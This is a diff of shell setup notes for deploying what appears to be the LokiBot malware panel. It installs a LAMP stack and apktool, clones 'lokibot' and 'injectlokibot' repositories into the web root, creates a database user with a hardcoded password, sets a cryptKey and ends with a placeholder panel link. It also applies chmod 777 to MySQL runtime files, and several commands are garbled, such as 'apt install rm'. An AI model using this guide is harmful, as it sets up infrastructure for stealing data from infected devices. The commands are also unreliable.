@@ -1,9 +1,10 @@
 su
 cd ~
-apt-get update && apt-get upgrade -y
+apt update
 apt install nano
 apt install unzip
 apt install zip
+apt install rm
 apt install nodejs
 apt install npm
 apt install mv
@@ -11,13 +12,19 @@ apt install git
 apt install wget
 apt install sudo
 _____________________________________________________
+apt update
 apt install apache2
 apt-get install -y mysql-server
+service mysql stop
+service mysql start
+cd /var/run
+chmod 777 mysqld
+cd mysqld && chmod 777 *.*
+cd ~
 add-apt-repository ppa:ondrej/php
 apt update
 apt install software-properties-common ca-certificates lsb-release apt-transport-https 
-apt install php5.6
-apt install php5.6-mysql php5.6-mbstring php5.6-xml php5.6-curl php5.6-json php5.6-zip
+apt install sudo apt-get install php5.6 php5.6-mysql php5.6-gd php5.6-mcrypt php5.6-mbstring php5.6-sqlite3 libapache2-mod-php5.6
 service apache2 restart
 _____________________________________________________
 apktool install
@@ -25,6 +32,7 @@ git clone https://github.com/h4ckti2/apktool
 cd apktool
 chmod 777 *.*
 mv *.* /usr/local/bin/
+mv apktool /usr/local/bin
 cd ~
 ________________________
 java install
@@ -37,11 +45,9 @@ CREATE USER 'lokiadmin'@'127.0.0.1' IDENTIFIED BY 'Ajh95a6M';
 GRANT ALL PRIVILEGES ON * . * TO 'lokiadmin'@'127.0.0.1';
 create database loki;
 ctrl + D
-cd ~
+cd /var/www/html
 git clone https://github.com/h4ckti2/lokibot
 cd lokibot
-mv *.* /var/www/html
-cd /var/www/html
 mysql -u root -p loki < mysql.sql
 ________________________
 login
@@ -51,3 +57,7 @@ cryptKey = loki
 ____________
 inject
 https://github.com/h4ckti2/injectlokibot
+
+___________________
+your link
+http://host.com/lokibot
